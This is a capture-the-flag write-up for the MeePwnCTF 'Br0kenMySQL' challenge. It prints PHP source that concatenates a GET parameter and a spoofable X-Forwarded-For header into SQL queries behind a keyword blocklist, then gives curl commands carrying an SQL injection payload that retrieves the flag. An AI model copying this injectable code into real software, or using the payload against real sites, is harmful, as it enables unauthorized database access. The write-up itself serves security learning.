# Br0kenMySQL

**100 pts**

> [BabeTrick](http://139.59.239.133/?debug=%F0%9F%95%B5)

---

# Writeups
```php
<title>Br0kenMySQL</title><h1><pre>
<p style='color:Red'>Br0kenMySQL</p>
<?php

if($_GET['debug']=='🕵') die(highlight_file(__FILE__));

require 'config.php';

$link = mysqli_connect('localhost', MYSQL_USER, MYSQL_PASSWORD);

if (!$link) {
    die('Could not connect: ' . mysql_error());
}

if (!mysqli_select_db($link,MYSQL_USER)) {
    die('Could not select database: ' . mysql_error());
}
    $id = $_GET['id'];
    if(preg_match('#sleep|benchmark|floor|rand|count#is',$id))
        die('Don\'t hurt me :-(');
    $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id);
    $row = mysqli_fetch_array($query);
    $username = $row['username'];

    if($username === 'guest'){

        $ip = @$_SERVER['HTTP_X_FORWARDED_FOR']!="" ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
        if(preg_match('#sleep|benchmark|floor|rand|count#is',$ip))
            die('Don\'t hurt me :-(');
        var_dump($ip);
        if(!empty($ip))
            mysqli_query($link,"INSERT INTO logs VALUES('{$ip}')");

        $query = mysqli_query($link,"SELECT username FROM users WHERE id = ". $id);
        $row = mysqli_fetch_array($query);
        $username = $row['username'];
        if($username === 'admin'){
            echo "What ???????\nLogin as guest&admin at the same time ?\nSeems our code is broken, here is your bounty\n";
            die(FLAG);
        }
        echo "Nothing here";
    } else {
        echo "Hello ".$username;
    }
?>
</h1>
</pre>

1
```

```bash
$ curl http://139.59.239.133/?id=2 or id=(SELECT 1 FROM logs WHERE ip=65468746165416354
ORDER BY id DESC LIMIT 1) LIMIT 1

$ curl --header "X-Forwarded-For: 865749654"
"http://139.59.239.133/?id=2%20or%20id=(SELECT%201%20FROM%20logs%20WHERE%20ip=865749654%20ORDER%20BY%20id%20DESC%20LIMIT%201)%20LIMIT%201"
```
```html
<title>Br0kenMySQL</title><h1><pre>
<p style='color:Red'>Br0kenMySQL</p>
string(8) "86574965"
What ???????
Login as guest&admin at the same time ?
Seems our code is broken, here is your bounty
MeePwnCTF{_b4by_tr1ck_fixed}
```
